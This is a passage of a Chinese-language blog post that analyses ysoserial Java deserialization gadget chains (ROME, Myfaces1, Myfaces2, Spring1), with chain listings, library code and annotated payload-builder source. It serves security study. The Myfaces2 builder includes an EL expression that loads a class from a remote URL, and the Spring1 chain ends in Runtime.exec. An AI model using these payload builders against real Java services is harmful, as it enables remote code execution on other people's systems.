class="variable">var10002</span> <span class="operator">=</span> x;</span><br><span class="line">        x = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">core$constantly$fn__4614</span>(var10002);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var10000</span> <span class="operator">=</span> var1;</span><br><span class="line">        var1 = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> invokeStatic(var10000);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就一个赋值操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> core$constantly$fn__4614(Object var1) &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clojure.core$comp().invoke 实际调用 core$comp$fn__4727</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Object var2)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var10000</span> <span class="operator">=</span> var1;</span><br><span class="line">    var1 = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var10001</span> <span class="operator">=</span> var2;</span><br><span class="line">    var2 = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> invokeStatic(var10000, var10001);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">invokeStatic</span><span class="params">(Object f, Object g)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var10002</span> <span class="operator">=</span> g;</span><br><span class="line">    g = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var10003</span> <span class="operator">=</span> f;</span><br><span class="line">    f = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">core$comp$fn__4727</span>(var10002, var10003);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就一个赋值操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> core$comp$fn__4727(Object var1, Object var2) &#123;</span><br><span class="line">    <span class="built_in">this</span>.g = var1;</span><br><span class="line">    <span class="built_in">this</span>.f = var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>model.__initClojureFnMappings(PersistentArrayMap.create(fnMap)); 也就是赋值操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">__updateClojureFnMappings</span><span class="params">(IPersistentMap var1)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.__clojureFnMap = (IPersistentMap)((IPersistentCollection)<span class="built_in">this</span>.__clojureFnMap).cons(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h2><blockquote><p>ROME 是 RSS&#x2F;Atom 订阅框架<br>和 CC2 类似，使用 TemplatesImpl 承载恶意代码；和 URLDNS 类似，利用 HashMap 的反序列化操作<br>通过 ObjectBean.hashCode 触发</p></blockquote><p>适用版本</p><ul><li>rome:1.0</li></ul><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            ObjectBean.hashCode()</span><br><span class="line">                EqualsBean.beanHashCode()</span><br><span class="line">                    ObjectBean.toString()</span><br><span class="line">                        ToStringBean.toString()</span><br><span class="line">                            ToStringBean.toString(String)</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.getOutputProperties()</span><br><span class="line">                                        ...</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/kIZ8fRB4lNpuyA9.png" ><p>ysoserial.payloads.ROME#getObject 十分简短，需要注意的是这里必须通过两个 ObjectBean 才能触发漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 创建 TemplatesImpl 承载执行代码</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过两个 ObjectBean 达成触发条件</span></span><br><span class="line">    <span class="type">ObjectBean</span> <span class="variable">delegate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, o);</span><br><span class="line">    <span class="type">ObjectBean</span> <span class="variable">root</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, delegate);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 HashMap</span></span><br><span class="line">    <span class="keyword">return</span> Gadgets.makeMap(root, root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果只用 <code>ObjectBean(Templates.class, TemplatesImpl)</code> 构造 HashMap，则反序列化时报错</p><ul><li>构造 POC 用的是 <code>ObjectBean(ObjectBean.class, ObjectBean(Templates.class, TemplatesImpl))</code></li></ul><p>因为计算哈希值时会对 value(TemplatesImpl) 调用 <code>ObjectBean.hashCode</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Exception <span class="keyword">in</span> thread <span class="string">&quot;main&quot;</span> java.lang.IllegalArgumentException: class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl is not instance of class com.sun.syndication.feed.impl.ObjectBean</span><br><span class="line">at com.sun.syndication.feed.impl.EqualsBean.&lt;init&gt;(EqualsBean.java:85)</span><br><span class="line">at com.sun.syndication.feed.impl.ObjectBean.&lt;init&gt;(ObjectBean.java:74)</span><br><span class="line">at com.sun.syndication.feed.impl.ObjectBean.&lt;init&gt;(ObjectBean.java:56)</span><br><span class="line">at ysoserial.payloads.ROME.getObject(ROME.java:38)</span><br></pre></td></tr></table></figure><p>当 HashMap 反序列化时会对元素计算哈希值，调用对象的 hashCode 方法，这里就是 <code>ObjectBean.hashCode</code> 方法，实际调用的是 <code>EqualsBean.beanHashCode</code>，然后进一步调用 <code>ObjectBean.toString</code> 方法返回 <code>ToStringBean.toString</code>，在这个函数中会触发 <code>TemplatesImpl.getOutputProperties</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ObjectBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>._equalsBean.beanHashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EqualsBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">beanHashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>._obj.toString().hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ObjectBean</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>._toStringBean.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ToStringBean</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Stack</span> <span class="variable">stack</span> <span class="operator">=</span> (Stack)PREFIX_TL.get();</span><br><span class="line">    String[] tsInfo = (String[])(stack.isEmpty() ? <span class="literal">null</span> : stack.peek());</span><br><span class="line">    String prefix;</span><br><span class="line">    <span class="keyword">if</span> (tsInfo == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="built_in">this</span>._obj.getClass().getName();</span><br><span class="line">        prefix = className.substring(className.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        prefix = tsInfo[<span class="number">0</span>];</span><br><span class="line">        tsInfo[<span class="number">1</span>] = prefix;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.toString(prefix);   <span class="comment">// 这里</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">toString</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br><span class="line">        <span class="keyword">if</span> (pds != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">pName</span> <span class="operator">=</span> pds[i].getName();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">pReadMethod</span> <span class="operator">=</span> pds[i].getReadMethod();</span><br><span class="line">                <span class="keyword">if</span> (pReadMethod != <span class="literal">null</span> &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> pReadMethod.invoke(<span class="built_in">this</span>._obj, NO_PARAMS);    <span class="comment">// 执行指令，控制 this._obj 为 TemplatesImpl，pReadMethod.name 为 getOutputProperties</span></span><br><span class="line">                    <span class="built_in">this</span>.printProperty(sb, prefix + <span class="string">&quot;.&quot;</span> + pName, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;\n\nEXCEPTION: Could not complete &quot;</span> + <span class="built_in">this</span>._obj.getClass() + <span class="string">&quot;.toString(): &quot;</span> + var8.getMessage() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Myfaces1"><a href="#Myfaces1" class="headerlink" title="Myfaces1"></a>Myfaces1</h2><blockquote><p>MyFaces 是托管多个与 MVC Web 应用框架 JavaServer Faces(JSF) 技术相关的子项目；MyFaces Core 项目是 JSF 规范的实现<br>结合了反序列化与 EL 表达式执行的相关特点。EL 表达式的主要作用是在Java Web应用程序嵌入到网页中，用以访问页面的上下文以及不同作用域中的对象，取得对象属性的值，或执行简单的运算或判断操作。<br>需要构造 EL 表达式作为 payload</p></blockquote><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GadgetChain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            ValueExpressionMethodExpression.hashCode()</span><br><span class="line">                ValueExpressionMethodExpression.getMethodExpression()</span><br><span class="line">                    ValueExpressionMethodExpression.getMethodExpression(ELContext)</span><br><span class="line">                        ValueExpressionImpl.getValue()</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.Myfaces1#makeExpressionPayload 利用 MyFaces 构造触发利用的条件， EL 表达式解析和处理还需要由具体的 EL 实现类完成（如 juel 和 apache-el），其中的 ValueExpressionImpl.getValue 具体实现将触发真正的代码执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeExpressionPayload</span> <span class="params">( String expr )</span> <span class="keyword">throws</span> IllegalArgumentException, IllegalAccessException, Exception  &#123;</span><br><span class="line">    <span class="comment">// 初始化 FacesContext 及 ELContext</span></span><br><span class="line">    <span class="type">FacesContextImpl</span> <span class="variable">fc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FacesContextImpl</span>((ServletContext) <span class="literal">null</span>, (ServletRequest) <span class="literal">null</span>, (ServletResponse) <span class="literal">null</span>);</span><br><span class="line">    <span class="type">ELContext</span> <span class="variable">elContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FacesELContext</span>(<span class="keyword">new</span> <span class="title class_">CompositeELResolver</span>(), fc);</span><br><span class="line">    <span class="comment">// 使用反射将 elContext 写入 FacesContextImpl 中</span></span><br><span class="line">    Reflections.getField(FacesContextImplBase.class, <span class="string">&quot;_elContext&quot;</span>).set(fc, elContext);</span><br><span class="line">    <span class="comment">// 使用 ExpressionFactory 创建 ValueExpression</span></span><br><span class="line">    <span class="type">ExpressionFactory</span> <span class="variable">expressionFactory</span> <span class="operator">=</span> ExpressionFactory.newInstance();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 有害</span></span><br><span class="line">    <span class="type">ValueExpression</span> <span class="variable">ve1</span> <span class="operator">=</span> expressionFactory.createValueExpression(elContext, expr, Object.class);</span><br><span class="line">    <span class="type">ValueExpressionMethodExpression</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValueExpressionMethodExpression</span>(ve1);</span><br><span class="line">    <span class="comment">// 无害</span></span><br><span class="line">    <span class="type">ValueExpression</span> <span class="variable">ve2</span> <span class="operator">=</span> expressionFactory.createValueExpression(elContext, <span class="string">&quot;$&#123;true&#125;&quot;</span>, Object.class);</span><br><span class="line">    <span class="type">ValueExpressionMethodExpression</span> <span class="variable">e2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValueExpressionMethodExpression</span>(ve2);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造 HashMap</span></span><br><span class="line">    <span class="comment">// 先放入无害的 ValueExpression，put 到 map 之后再反射写入 valueExpression 字段</span></span><br><span class="line">    <span class="comment">// 避免构造过程中触发</span></span><br><span class="line">    <span class="keyword">return</span> Gadgets.makeMap(e2, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>触发条件的构造只涉及到 ValueExpressionMethodExpression 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">MethodExpression</span> <span class="variable">me</span> <span class="operator">=</span> <span class="built_in">this</span>.getMethodExpression();   <span class="comment">// 这里</span></span><br><span class="line">    <span class="keyword">return</span> me != <span class="literal">null</span> ? me.hashCode() : <span class="built_in">this</span>.valueExpression.hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> MethodExpression <span class="title function_">getMethodExpression</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 调用带参数的方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getMethodExpression(FacesContext.getCurrentInstance().getELContext());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> MethodExpression <span class="title function_">getMethodExpression</span><span class="params">(ELContext context)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">meOrVe</span> <span class="operator">=</span> <span class="built_in">this</span>.valueExpression.getValue(context); <span class="comment">// 这里，由具体实现类完成</span></span><br><span class="line">    <span class="keyword">if</span> (meOrVe <span class="keyword">instanceof</span> MethodExpression) &#123;</span><br><span class="line">        <span class="keyword">return</span> (MethodExpression)meOrVe;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(meOrVe <span class="keyword">instanceof</span> ValueExpression)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(meOrVe != <span class="literal">null</span> &amp;&amp; meOrVe <span class="keyword">instanceof</span> ValueExpression) &#123;</span><br><span class="line">            meOrVe = ((ValueExpression)meOrVe).getValue(context);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (MethodExpression)meOrVe;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Myfaces2"><a href="#Myfaces2" class="headerlink" title="Myfaces2"></a>Myfaces2</h2><blockquote><p>利用链同 Myfaces1<br>在 Myfaces1 的基础上使用 ClassLoader 远程加载恶意类的 EL 表达式执行代码，即提供构造 EL</p></blockquote><p>ysoserial.payloads.Myfaces2#getObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.lastIndexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Command format is: &lt;base_url&gt;:&lt;classname&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> command.substring(<span class="number">0</span>, sep);</span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> command.substring(sep + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// based on http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">expr</span> <span class="operator">=</span> <span class="string">&quot;$&#123;request.setAttribute(&#x27;arr&#x27;,&#x27;&#x27;.getClass().forName(&#x27;java.util.ArrayList&#x27;).newInstance())&#125;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we add fewer than the actual classloaders we end up with a null entry</span></span><br><span class="line">    <span class="keyword">for</span> ( <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ ) &#123;</span><br><span class="line">        expr += <span class="string">&quot;$&#123;request.getAttribute(&#x27;arr&#x27;).add(request.servletContext.getResource(&#x27;/&#x27;).toURI().create(&#x27;&quot;</span> + url + <span class="string">&quot;&#x27;).toURL())&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    expr += <span class="string">&quot;$&#123;request.getClass().getClassLoader().newInstance(request.getAttribute(&#x27;arr&#x27;)&quot;</span></span><br><span class="line">            + <span class="string">&quot;.toArray(request.getClass().getClassLoader().getURLs())).loadClass(&#x27;&quot;</span> + className + <span class="string">&quot;&#x27;).newInstance()&#125;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Myfaces1.makeExpressionPayload(expr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h2><p>适用版本</p><ul><li>spring-core:4.1.4.RELEASE</li><li>spring-beans:4.1.4.RELEASE</li></ul><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()</span><br><span class="line">SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">ReflectionUtils.findMethod()</span><br><span class="line">SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">ReflectionUtils.invokeMethod()</span><br><span class="line">Method.invoke()</span><br><span class="line">Templates(Proxy).newTransformer()</span><br><span class="line">AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()</span><br><span class="line">ObjectFactory(Proxy).getObject()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">Method.invoke()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br><span class="line">TemplatesImpl.defineTransletClasses()</span><br><span class="line">TemplatesImpl.TransletClassLoader.defineClass()</span><br><span class="line">Pwner*(Javassist-generated).&lt;static init&gt;</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/186GzSMsLyuAnil.png" ><p>ysoserial.payloads.Spring1#getObject 通过 MethodInvokeTypeProvider.readObject 触发方法调用，方法由 ObjectFactoryDelegatingInvocationHandler 代理，最终调用 TemplatesImpl.newTransformer 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 构造 TemplatesImpl 承载恶意指令</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 HashMap 承载 TemplatesImpl</span></span><br><span class="line">    <span class="comment">// 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法，返回 TemplatesImpl</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">ObjectFactory</span> <span class="variable">objectFactoryProxy</span> <span class="operator">=</span></span><br><span class="line">Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">&quot;getObject&quot;</span>, templates), ObjectFactory.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 objectFactoryProxy 实例化 ObjectFactoryDelegatingInvocationHandler，代理 Type 和 Templates（TemplatesImpl 父类）</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Type</span> <span class="variable">typeTemplatesProxy</span> <span class="operator">=</span> Gadgets.createProxy((InvocationHandler)</span><br><span class="line">Reflections.getFirstCtor(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>)</span><br><span class="line">.newInstance(objectFactoryProxy), Type.class, Templates.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 代理 TypeProvider 的 getType 方法，返回 typeTemplatesProxy 代理类</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">typeProviderProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(</span><br><span class="line">Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy),</span><br><span class="line">forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用 typeProviderProxy 初始化 MethodInvokeTypeProvider</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Constructor</span> <span class="variable">mitpCtor</span> <span class="operator">=</span> Reflections.getFirstCtor(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">    <span class="comment">// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())</span></span><br><span class="line"><span class="comment">// 所以初始化时随便给个 Method，methodName</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">mitp</span> <span class="operator">=</span> mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;&#125;), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用反射赋值，调用 newTransformer 方法</span></span><br><span class="line">Reflections.setFieldValue(mitp, <span 